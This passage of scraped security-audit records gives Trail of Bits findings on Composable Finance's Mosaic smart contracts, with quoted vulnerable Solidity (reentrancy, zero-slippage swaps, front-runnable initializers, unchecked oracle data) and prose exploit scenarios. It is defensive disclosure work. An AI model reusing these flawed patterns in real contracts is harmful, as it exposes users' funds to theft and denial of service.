Long term, review the codebase for instances in which data is indexed without undergoing a length check; handling untrusted data in this way may lead to a more severe DoS. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Initialization functions can be front-run ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The CrosslayerPortal contracts have initializer functions that can be front-run, allowing an attacker to incorrectly initialize the contracts. Due to the use of the delegatecall proxy pattern, these contracts cannot be initialized with their own constructors, and they have initializer functions: function initialize() public initializer { __Ownable_init(); __Pausable_init(); __ReentrancyGuard_init(); } Figure 1.1: The initialize function in MsgSender:126-130 An attacker could front-run these functions and initialize the contracts with malicious values. This issue aects the following system contracts:  contracts/core/BridgeAggregator  contracts/core/InvestmentStrategyBase  contracts/core/MosaicHolding  contracts/core/MosaicVault  contracts/core/MosaicVaultConfig  contracts/core/functionCalls/MsgReceiverFactory  contracts/core/functionCalls/MsgSender  contracts/nfts/Summoner  contracts/protocols/aave/AaveInvestmentStrategy  contracts/protocols/balancer/BalancerV1Wrapper  contracts/protocols/balancer/BalancerVaultV2Wrapper  contracts/protocols/bancor/BancorWrapper  contracts/protocols/compound/CompoundInvestmentStrategy  contracts/protocols/curve/CurveWrapper  contracts/protocols/gmx/GmxWrapper  contracts/protocols/sushiswap/SushiswapLiquidityProvider  contracts/protocols/synapse/ISynapseSwap  contracts/protocols/synapse/SynapseWrapper  contracts/protocols/uniswap/IUniswapV2Pair  contracts/protocols/uniswap/UniswapV2Wrapper  contracts/protocols/uniswap/UniswapWrapper Exploit Scenario Bob deploys the MsgSender contract. Eve front-runs the contracts initialization and sets her own address as the owner address. As a result, she can use the initialize function to update the contracts variables, modifying the system parameters. Recommendations Short term, to prevent front-running of the initializer functions, use hardhat-deploy to initialize the contracts or replace the functions with constructors. Alternatively, create a deployment script that will emit sucient errors when an initialize call fails. Long term, carefully review the Solidity documentation, especially the Warnings section, as well as the pitfalls of using the delegatecall proxy pattern.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Trades are vulnerable to sandwich attacks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The swapToNative function does not allow users to specify the minAmountOut parameter of swapExactTokensForETH , which indicates the minimum amount of ETH that a user will receive from a trade. Instead, the value is hard-coded to zero, meaning that there is no guarantee that users will receive any ETH in exchange for their tokens. By using a bot to sandwich a users trade, an attacker could increase the slippage incurred by the user and prot o of the spread at the users expense. The minAmountOut parameter is meant to prevent the execution of trades through illiquid pools and to provide protection against sandwich attacks. The current implementation lacks protections against high slippage and may cause users to lose funds. This applies to the AVAX version, too. Composable Finance indicated that only the relayer will call this function, but the function lacks access controls to prevent users from calling it directly. Importantly, it is highly likely that if a relayer does not implement proper protections, all of its trades will suer from high slippage, as they will represent pure-prot opportunities for sandwich bots. uint256 [] memory amounts = swapRouter.swapExactTokensForETH( _amount, 0 , path, _to, deadline ); Figure 2.1: Part of the SwapToNative function in MosaicNativeSwapperETH.sol: 4450 Exploit Scenario Bob, a relayer, makes a trade on behalf of a user. The minAmountOut value is set to zero, which means that the trade can be executed at any price. As a result, when Eve sandwiches the trade with a buy and sell order, Bob sells the tokens without purchasing any, eectively giving away tokens for free. Recommendations Short term, allow users (relayers) to input a slippage tolerance, and add access controls to the swapToNative function. Long term, consider the risks of integrating with other protocols such as Uniswap and implement mitigations for those risks.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "3. forwardCall creates a denial-of-service attack vector ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Low-level external calls can exhaust all available gas by returning an excessive amount of data, thereby causing the relayer to incur memory expansion costs. This can be used to cause an out-of-gas exception and is a denial-of-service (DoS) attack vector. Since arbitrary contracts can be called, Composable Finance should implement additional safeguards. If an out-of-gas exception occurs, the message will never be marked as forwarded ( forwarded[id] = true ). If the relayer repeatedly retries the transaction, assuming it will eventually be marked as forwarded, the queue of pending transactions will grow without bounds, with each unsuccessful message-forwarding attempt carrying a gas cost. The approveERC20TokenAndForwardCall function is also vulnerable to this DoS attack. (success, returnData) = _contract. call {value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require ( balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; Figure 3.1: Part of the forwardCall function in MsgReceiver:79-85 Exploit Scenario Eve deploys a contract that returns 10 million bytes of data. A call to that contract causes an out-of-gas exception. Since the transaction is not marked as forwarded, the relayer continues to propagate the transaction without success. This results in excessive resource consumption and a degraded quality of service. Recommendations Short term, require that the size of return data be xed to 32 bytes. Long term, review the documentation on low-level Solidity calls and EVM edge cases. References  Excessively Safe Call", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "8. Lack of two-step process for contract ownership changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The owner of a contract in the Composable Finance ecosystem can be changed through a call to the transferOwnership function. This function internally calls the setOwner function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. /** * @dev Leaves the contract without owner. It will not be possible to call * `onlyOwner` functions anymore. Can only be called by the current owner. * * NOTE: Renouncing ownership will leave the contract without an owner, * thereby removing any functionality that is only available to the owner. */ function renounceOwnership () public virtual onlyOwner { _setOwner( address ( 0 )); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Can only be called by the current owner. */ function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _setOwner(newOwner); } function _setOwner ( address newOwner ) private { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 8.1: OpenZeppelins OwnableUpgradeable contract Exploit Scenario Bob, a Composable Finance developer, invokes transferOwnership() to change the address of an existing contracts owner but accidentally enters the wrong address. As a result, he permanently loses access to the contract. Recommendations Short term, perform ownership transfers through a two-step process in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "9. sendFunds is vulnerable to reentrancy by owners ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The sendFunds function is vulnerable to reentrancy and can be used by the owner of a token contract to drain the contract of its funds. Specically, because fundsTransfered[user] is written to after a call to an external contract, the contracts owner could input his or her own address and reenter the sendFunds function to drain the contracts funds. An owner could send funds to him- or herself without using the reentrancy, but there is no reason to leave this vulnerability in the code. Additionally, the FundKeeper contract can send funds to any user by calling setAmountToSend and then sendFunds . It is unclear why amountToSend is not changed (set to zero) after a successful transfer. It would make more sense to call setAmountToSend after each transfer and to store users balances in a mapping. function setAmountToSend ( uint256 amount ) external onlyOwner { amountToSend = amount; emit NewAmountToSend(amount); } function sendFunds ( address user ) external onlyOwner { require (!fundsTransfered[user], \"reward already sent\" ); require ( address ( this ).balance >= amountToSend, \"Contract balance low\" ); // solhint-disable-next-line avoid-low-level-calls ( bool sent , ) = user.call{value: amountToSend}( \"\" ); require (sent, \"Failed to send Polygon\" ); fundsTransfered[user] = true ; emit FundSent(amountToSend, user); } Figure 9.1: Part of the sendFunds function in FundKeeper.sol:23-38 Exploit Scenario Eves smart contract is the owner of the FundKeeper contract. Eves contract executes a transfer for which Eve should receive only 1 ETH. Instead, because the user address is a contract with a fallback function, Eve can reenter the sendFunds function and drain all ETH from the contract. Recommendations Short term, set fundsTransfered[user] to true prior to making external calls. Long term, store each users balance in a mapping to ensure that users cannot make withdrawals that exceed their balances. Additionally, follow the checks-eects-interactions pattern.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "20. MosaicVault and MosaicHolding owner has excessive privileges ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The owner of the MosaicVault and MosaicHolding contracts has too many privileges across the system. Compromise of the owners private key would put the integrity of the underlying system at risk. The owner of the MosaicVault and MosaicHolding contracts can perform the following privileged operations in the context of the contracts:       Rescuing funds if the system is compromised Managing withdrawals, transfers, and fee payments Pausing and unpausing the contracts Rebalancing liquidity across chains Investing in one or more investment strategies Claiming rewards from one or more investment strategies The ability to drain funds, manage liquidity, and claim rewards creates a single point of failure. It increases the likelihood that the contracts owner will be targeted by an attacker and increases the incentives for the owner to act maliciously. Exploit Scenario Alice, the owner of MosaicVault and MosaicHolding , deploys the contracts. MosaicHolding eventually holds assets worth USD 20 million. Eve gains access to Alices machine, upgrades the implementations, pauses MosaicHolding , and drains all funds from the contract. Recommendations Short term, clearly document the functions and implementations that the owner of the MosaicVault and MosaicHolding contracts can change. Additionally, split the privileges provided to the owner across multiple roles (e.g., a fund manager, fund rescuer, owner, etc.) to ensure that no one address has excessive control over the system. Long term, develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "24. SushiswapLiquidityProvider deposits cannot be used to cover withdrawal requests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Withdrawal requests that require the removal of liquidity from a Sushiswap liquidity pool will revert and cause a system failure. When a user requests a withdrawal of liquidity from the Mosaic system, MosaicVault (via the coverWithdrawRequest() function) queries MosaicHolding to see whether liquidity must be removed from an investment strategy to cover the withdrawal amount (gure 24.1). function _withdraw ( address _accountTo , uint256 _amount , address _tokenIn , address _tokenOut , uint256 _amountOutMin , WithdrawData calldata _withdrawData, bytes calldata _data ) { internal onlyWhitelistedToken(_tokenIn) validAddress(_tokenOut) nonReentrant onlyOwnerOrRelayer whenNotPaused returns ( uint256 withdrawAmount ) IMosaicHolding mosaicHolding = IMosaicHolding(vaultConfig.getMosaicHolding()); require (hasBeenWithdrawn[_withdrawData.id] == false , \"ERR: ALREADY WITHDRAWN\" ); if (_tokenOut == _tokenIn) { require ( mosaicHolding.getTokenLiquidity(_tokenIn, _withdrawData.investmentStrategies) >= _amount, \"ERR: VAULT BAL\" ); } [...] mosaicHolding.coverWithdrawRequest( _withdrawData.investmentStrategies, _tokenIn, withdrawAmount ); [...] } Figure 24.1: The _ withdraw function in MosaicVault :40 4-474 If MosaicHolding s balance of the token being withdrawn ( _tokenIn ) is not sucient to cover the withdrawal, MosaicHolding will iterate through each investment strategy in the _investmentStrategy array and remove enough _tokenIn to cover it. To remove liquidity from an investment strategy, it calls withdrawInvestment() on that strategy (gure 24.2). function coverWithdrawRequest ( address [] calldata _investmentStrategies, address _token , uint256 _amount ) external override { require (hasRole(MOSAIC_VAULT, msg.sender ), \"ERR: PERMISSIONS A-V\" ); uint256 balance = IERC20(_token).balanceOf( address ( this )); if (balance >= _amount) return ; uint256 requiredAmount = _amount - balance; uint8 index ; while (requiredAmount > 0 ) { address strategy = _investmentStrategies[index]; IInvestmentStrategy investment = IInvestmentStrategy(strategy); uint256 investmentAmount = investment.investmentAmount(_token); uint256 amountToWithdraw = 0 ; if (investmentAmount >= requiredAmount) { amountToWithdraw = requiredAmount; requiredAmount = 0 ; } else { amountToWithdraw = investmentAmount; requiredAmount = requiredAmount - investmentAmount; } IInvestmentStrategy.Investment[] memory investments = new IInvestmentStrategy.Investment[]( 1 ); investments[ 0 ] = IInvestmentStrategy.Investment(_token, amountToWithdraw); IInvestmentStrategy(investment).withdrawInvestment(investments, \"\" ); emit InvestmentWithdrawn(strategy, msg.sender ); index++; } require (IERC20(_token).balanceOf( address ( this )) >= _amount, \"ERR: VAULT BAL\" ); } Figure 24.2: The coverWithdrawRequest function in MosaicHolding:217-251 This process works for an investment strategy in which the investments array function argument has a length of 1. However, in the case of SushiswapLiquidityProvider , the withdrawInvestment() function expects the investments array to have a length of 2 (gure 24.3). function withdrawInvestment (Investment[] calldata _investments, bytes calldata _data) external override onlyInvestor nonReentrant { Investment memory investmentA = _investments[ 0 ]; Investment memory investmentB = _investments[ 1 ]; ( uint256 deadline , uint256 liquidity ) = abi.decode(_data, ( uint256 , uint256 )); IERC20Upgradeable pair = IERC20Upgradeable(getPair(investmentA.token, investmentB.token)); pair.safeIncreaseAllowance( address (sushiSwapRouter), liquidity); ( uint256 amountA , uint256 amountB ) = sushiSwapRouter.removeLiquidity( investmentA.token, investmentB.token, liquidity, investmentA.amount, investmentB.amount, address ( this ), deadline ); IERC20Upgradeable(investmentA.token).safeTransfer(mosaicHolding, amountA); IERC20Upgradeable(investmentB.token).safeTransfer(mosaicHolding, amountB); } Figure 24.3: The withdrawInvestment function in SushiswapLiquidityProvider :90-113 Thus, any withdrawal request that requires the removal of liquidity from SushiswapLiquidityProvider will revert. Exploit Scenario Alice wishes to withdraw liquidity ( tokenA ) that she deposited into the Mosaic system. The MosaicHolding contract does not hold enough tokenA to cover the withdrawal and thus tries to withdraw tokenA from the SushiswapLiquidityProvider investment strategy. The request reverts, and Alices withdrawal request fails, leaving her unable to access her funds. Recommendations Short term, avoid depositing user liquidity into the SushiswapLiquidityProvider investment strategy. Long term, take the following steps:   Identify and implement one or more data structures that will reduce the technical debt resulting from the use of the InvestmentStrategy interface. Develop a more eective solution for covering withdrawals that does not consistently require withdrawing funds from other investment strategies.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "26. MosaicVault and MosaicHolding owner is controlled by a single private key ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The MosaicVault and MosaicHolding contracts manage many critical functionalities, such as those for rescuing funds, managing liquidity, and claiming rewards. The owner of these contracts is a single externally owned account (EOA). As mentioned in TOB-CMP-20 , this creates a single point of failure. Moreover, it makes the owner a high-value target for attackers and increases the incentives for the owner to act maliciously. If the private key is compromised, the system will be compromised too. Exploit Scenario Alice, the owner of the MosaicVault and MosaicHolding contracts, deploys the contracts. MosaicHolding eventually holds assets worth USD 20 million. Eve gains access to Alices machine, upgrades the implementations, pauses MosaicHolding , and drains all funds from the contract. Recommendations Short term, change the owner of the contracts from a single EOA to a multi-signature account. Long term, take the following steps:   Develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure. Assess the systems key management infrastructure and document the associated risks as well as an incident response plan.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "27. The relayer is a single point of failure ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Because the relayer is a centralized service that is responsible for critical functionalities, it constitutes a single point of failure within the Mosaic ecosystem. The relayer is responsible for the following tasks:       Managing withdrawals across chains Managing transfers across chains Managing the accrued interest on all users investments Executing cross-chain message call requests Collecting fees for all withdrawals, transfers, and cross-chain message calls Refunding fees in case of failed transfers or withdrawals The centralized design and importance of the relayer increase the likelihood that the relayer will be targeted by an attacker. Exploit Scenario Eve, an attacker, is able to gain root access on the server that runs the relayer. Eve can then shut down the Mosaic system by stopping the relayer service. Eve can also change the source code to trigger behavior that can lead to the drainage of funds. Recommendations Short term, document an incident response plan and monitor exposed ports and services that may be vulnerable to exploitation. Long term, arrange an external security audit of the core and peripheral relayer source code. Additionally, consider implementing a decentralized relayer architecture more resistant to system takeovers.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Although dependency scans did not yield a direct threat to the project under review, npm and yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "10. DoS risk created by cross-chain message call requests on certain networks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Cross-chain message calls that are requested on a low-fee, low-latency network could facilitate a DoS, preventing other users from interacting with the system. If a user, through the MsgSender contract, sent numerous cross-chain message call requests, the relayer would have to act upon the emitted events regardless of whether they were legitimate or part of a DoS attack. Exploit Scenario Eve creates a theoretically innite series of transactions on Arbitrum, a low-fee, low-latency network. The internal queue of the relayer is then lled with numerous malicious transactions. Alice requests a cross-chain message call; however, because the relayer must handle many of Eves transactions rst, Alice has to wait an undened amount of time for her transaction to be executed. Recommendations Short term, create multiple queues that work across the various chains to mitigate this DoS risk. Long term, analyze the implications of the ability to create numerous message calls on low-fee networks and its impact on relayer performance.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "12. Unimplemented getAmountsOut function in Balancer V2 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The getAmountsOut function in the BalancerV2Wrapper contract is unimplemented. The purpose of the getAmountsOut() function, shown in gure 12.1, is to allow users to know the amount of funds they will receive when executing a swap. Because the function does not invoke any functions on the Balancer Vault, a user must actually perform a swap to determine the amount of funds he or she will receive: function getAmountsOut ( address , address , uint256 , bytes calldata ) external pure override returns ( uint256 ) { return 0 ; } Figure 12.1: The getAmountsOut function in BalancerVaultV2Wrapper:43-50 Exploit Scenario Alice, a user of the Composable Finance vaults, wants to swap 100 USDC for DAI on Balancer. Because the getAmountsOut function is not implemented, she is unable to determine how much DAI she will receive before executing the swap. Recommendations Short term, implement the getAmountsOut function and have it call the queryBatchSwap function on the Balancer Vault. Long term, add unit tests for all functions to test all ows. Unit tests will detect incorrect function behavior.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "28. Lack of events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setRelayer function, which is called in the MosaicVault contract to set the relayer address, does not emit an event providing conrmation of that operation to the contracts caller (gure 28.1). function setRelayer ( address _relayer ) external override onlyOwner { relayer = _relayer; } Figure 28.1: The setRelayer() function in MosaicVault:80-82 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to take ownership of the MosaicVault contract. She then sets a new relayer address. Alice, a Composable Finance team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components. 30. Insu\u0000cient protection of sensitive information Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-CMP-30 Target: CrosslayerPortal/env , bribe-protocol/hardhat.config.ts", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "5. Accrued interest is not attributable to the underlying investor on-chain ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "When an investor earns interest-bearing tokens by lending funds through Mosaics investment strategies, the tokens are not directly attributed to the investor by on-chain data. The claim() function, which can be called only by the owner of the MosaicHolding contract, is dened in the contract and used to redeem interest-bearing tokens from protocols such as Aave and Compound (gure 5.1). The underlying tokens of these protocols lending pools are provided by users who are interacting with the Mosaic system and wish to earn rewards on their idle funds. function claim ( address _investmentStrategy , bytes calldata _data) external override onlyAdmin validAddress(_investmentStrategy) { require (investmentStrategies[_investmentStrategy], \"ERR: STRATEGY NOT SET\" ); address rewardTokenAddress = IInvestmentStrategy(_investmentStrategy).claimTokens(_data); emit TokenClaimed(_investmentStrategy, rewardTokenAddress); } Figure 5.1: The claim function in MosaicHolding:270-279 During the execution of claim() , the internal claimTokens() function calls into the AaveInvestmentStrategy , CompoundInvestmentStrategy , or SushiswapLiquidityProvider contract, which eectively transfers its balance of the interest-bearing token directly to the MosaicHolding contract. Figure 5.2 shows the claimTokens() function call in AaveInvestmentStrategy . function claimTokens ( bytes calldata data) external override onlyInvestor returns ( address ) { address token = abi.decode(data, ( address )); ILendingPool lendingPool = ILendingPool(lendingPoolAddressesProvider.getLendingPool()); DataTypes.ReserveData memory reserve = lendingPool.getReserveData(token); IERC20Upgradeable(reserve.aTokenAddress).safeTransfer( mosaicHolding, IERC20Upgradeable(reserve.aTokenAddress).balanceOf( address ( this )) ); return reserve.aTokenAddress; } Figure 5.2: The c laimTokens function in AaveInvestmentStrategy:58-68 However, there is no identiable mapping or data structure attributing a percentage of those rewards to a given user. The o-chain relayer service is responsible for holding such mappings and rewarding users with the interest they have accrued upon withdrawal (see the r elayer bot assumptions in the Project Coverage section). Exploit Scenario Investors Alice and Bob, who wish to earn interest on their idle USDC, decide to use the Mosaic system to provide loans. Mosaic invests their money in Aaves lending pool for USDC. However, there is no way for the parties to discern their ownership stakes in the lending pool through the smart contract logic. The owner of the contract decides to call the claim() function and redeem all aUSDC associated with Alices and Bobs positions. When Bob goes to withdraw his funds, he has to trust that the relayer will send him his claim on the aUSDC without any on-chain verication. Recommendations Short term, consider implementing a way to identify the amount of each investors stake in a given investment strategy. Currently, the relayer is responsible for tracking all rewards. Long term, review the privileges and responsibilities of the relayer and architect a more robust solution for managing investments.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "6. User funds can become trapped in nonstandard token contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "If a users funds are transferred to a token contract that violates the ERC20 standard, the funds may become permanently trapped in that token contract. In the MsgReceiver contract, there are six calls to the transfer() function. See gure 6.1 for an example. function approveERC20TokenAndForwardCall( uint256 _feeAmount, address _feeToken, address _feeReceiver, address _token, uint256 _amount, bytes32 _id, address _contract, bytes calldata _data ) external payable onlyOwnerOrRelayer returns ( bool success, bytes memory returnData) { require ( IMsgReceiverFactory(msgReceiverFactory).whitelistedFeeTokens(_feeToken), \"Fee token is not whitelisted\" ); require (!forwarded[_id], \"call already forwared\" ); //approve tokens to _contract IERC20(_token).safeIncreaseAllowance(_contract, _amount); // solhint-disable-next-line avoid-low-level-calls (success, returnData) = _contract.call{value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require (balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; IERC20(_feeToken).transfer(_feeReceiver, _feeAmount); } Figure 6.1: The approveERC20TokenAndForwardCall function in MsgReceiver:98- When implemented in accordance with the ERC20 standard, the transfer() function returns a boolean indicating whether a transfer operation was successful. However, tokens that implement the ERC20 interface incorrectly may not return true upon a successful transfer, in which case the transaction will revert and the users funds will be locked in the token contract. Exploit Scenario Alice, the owner of the MsgReceiverFactory contract, adds a fee token that is controlled by Eve. Eves token contract incorrectly implements the ERC20 interface. Bob interacts with MsgReceiver and calls a function that executes a transfer to _feeReceiver , which is controlled by Eve. Because Eves fee token contract does not provide a return value, Bobs transfer reverts. Recommendations Short term, use safeTransfer() for token transfers and use the SafeERC20 library for interactions with ERC20 token contracts. Long term, develop a process for onboarding new fee tokens. Review our Token Integration Checklist for guidance on the onboarding process. References  Missing Return Value Bug", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "13. Use of MsgReceiver to check _feeToken status leads to unnecessary gas consumption ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Checking the whitelist status of a token only on the receiving end of a message call can lead to excessive gas consumption. As part of a cross-chain message call, all functions in the MsgReceiver contract check whether the token used for the payment to _feeReceiver ( _feeToken ) is a whitelisted token (gure 13.1). Tokens are whitelisted by the owner of the MsgReceiverFactory contract. function approveERC20TokenAndForwardCall( uint256 _feeAmount, address _feeToken, address _feeReceiver, address _token, uint256 _amount, bytes32 _id, address _contract, bytes calldata _data ) external payable onlyOwnerOrRelayer returns ( bool success, bytes memory returnData) { require ( IMsgReceiverFactory(msgReceiverFactory).whitelistedFeeTokens(_feeToken), \"Fee token is not whitelisted\" ); require (!forwarded[_id], \"call already forwared\" ); //approve tokens to _contract IERC20(_token).safeIncreaseAllowance(_contract, _amount); // solhint-disable-next-line avoid-low-level-calls (success, returnData) = _contract.call{value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require (balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; IERC20(_feeToken).transfer(_feeReceiver, _feeAmount); } Figure 13.1: The approveERC20TokenAndForwardCall function in M sgReceiver:98-123 This validation should be performed before the MsgSender contract emits the related event (gure 13.2). This is because the relayer will act upon the emitted event on the receiving chain regardless of whether _feeToken is set to a whitelisted token. function registerCrossFunctionCallWithTokenApproval( uint256 _chainId, address _destinationContract, address _feeToken, address _token, uint256 _amount, bytes calldata _methodData ) { external override nonReentrant onlyWhitelistedNetworks(_chainId) onlyUnpausedNetworks(_chainId) whenNotPaused bytes32 id = _generateId(); //shouldn't happen require (hasBeenForwarded[id] == false , \"Call already forwarded\" ); require (lastForwardedCall != id, \"Forwarded last time\" ); lastForwardedCall = id; hasBeenForwarded[id] = true ; emit ForwardCallWithTokenApproval( msg.sender , id, _chainId, _destinationContract, _feeToken , _token, _amount, _methodData ); } Figure 13.2: The registerCrossFunctionCallWithTokenApproval function in M sgSender:169-203 Exploit Scenario On Arbitrum, a low-fee network, Eve creates a theoretically innite series of transactions to be sent to MsgSender , with _feeToken set to a token that she knows is not whitelisted. The relayer relays the series of message calls to a MsgReceiver contract on Ethereum, a high-fee network, and all of the transactions revert. However, the relayer has to pay the intrinsic gas cost for each transaction, with no repayment, while allowing its internal queue to be lled up with malicious transactions. Recommendations Short term, move the logic for token whitelisting and validation to the MsgSender contract. Long term, analyze the implications of the ability to create numerous message calls on low-fee networks and its impact on relayer performance.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "14. Active liquidity providers can set arbitrary _tokenOut values when withdrawing liquidity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "An active liquidity provider (LP) can move his or her liquidity into any token, even one that the LP controls. When a relayer acts upon a WithdrawRequest event triggered by an active LP, the MosaicVault contract checks only that the address of _tokenOut (the token being requested) is not the zero address (gure 14.1). Outside of that constraint, _tokenOut can eectively be set to any token, even one that might have vulnerabilities. function _withdraw( address _accountTo, uint256 _amount, address _tokenIn, address _tokenOut, uint256 _amountOutMin, WithdrawData calldata _withdrawData, bytes calldata _data ) internal onlyWhitelistedToken(_tokenIn) validAddress(_tokenOut) nonReentrant onlyOwnerOrRelayer whenNotPaused returns ( uint256 withdrawAmount) Figure 14.1: The signature of the _withdraw function in M osaicVault:404-419 This places the burden of ensuring the swaps success on the decentralized exchange, and, as the application grows, can lead to unintended code behavior. Exploit Scenario Eve, a malicious active LP, is able to trigger undened behavior in the system by setting _tokenOut to a token that is vulnerable to exploitation. Recommendations Short term, analyze the implications of allowing _tokenOut to be set to an arbitrary token. Long term, validate the assumptions surrounding the lack of limits on _tokenOut as the codebase grows, and review our Token Integration Checklist to identify any related pitfalls. References  imBTC Uniswap Hack", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "15. Withdrawal assumptions may lead to transfers of an incorrect token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The CurveTricryptoStrategy contract manages liquidity in Curve pools and facilitates transfers of tokens between chains. While it is designed to work with one curve vault, the vault can be set to an arbitrary pool. Thus, the contract should not make assumptions regarding the pool without validation. Each pool contains an array of tokens specifying the tokens to withdraw from that pool. However, when the vault address is set in the constructor of CurveTricryptoConfig , the pools address is not checked against the TriCrypto pools address. The token at index 2 in the coins array is assumed to be wrapped ether (WETH), as indicated by the code comment shown in gure 15.1. If the conguration is incorrect, a dierent token may be unintentionally transferred. if (unwrap) { //unwrap LP into weth transferredToken = tricryptoConfig.tricryptoLPVault().coins( 2 ); [...] Figure 15.1: Part of the transferLPs function in CurveTricryptoStrategy .sol:377-379 Exploit Scenario The Curve pool array, coins , stores an address other than that of WETH in index 2. As a result, a user mistakenly sends the wrong token in a transfer. Recommendations Short term, have the constructor of CurveTricryptoConfig or the transferLPs function validate that the address of transferredToken is equal to the address of WETH. Long term, validate data from external contracts, especially data involved in the transfer of funds.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "16. Improper validation of Chainlink data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The latestRoundData function returns a signed integer that is coerced to an unsigned integer without checking that the value is positive. An overow (e.g., uint(-1) ) would result in drastic misrepresentation of the price and unexpected behavior. In addition, ChainlinkLib does not ensure the completeness or recency of round data, so pricing data may not reect recent changes. It is best practice to dene a window in which data is considered suciently recent (e.g., within a minute of the last update) by comparing the block timestamp to updatedAt . (, int256 price , , , ) = _aggregator.latestRoundData(); return uint256 (price); Figure 16.1: Part of the getCurrentTokenPrice function in ChainlinkLib.sol:113-114 Recommendations Short term, have latestRoundData and similar functions verify that values are non-negative before converting them to unsigned integers, and add an invariant require(updatedAt != 0 && answeredInRound == roundID) to ensure that the round has nished and that the pricing data is from the current round. Long term, dene a minimum update threshold and add the following check: require((block.timestamp - updatedAt <= minThreshold) && (answeredInRound == roundID)) .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "25. 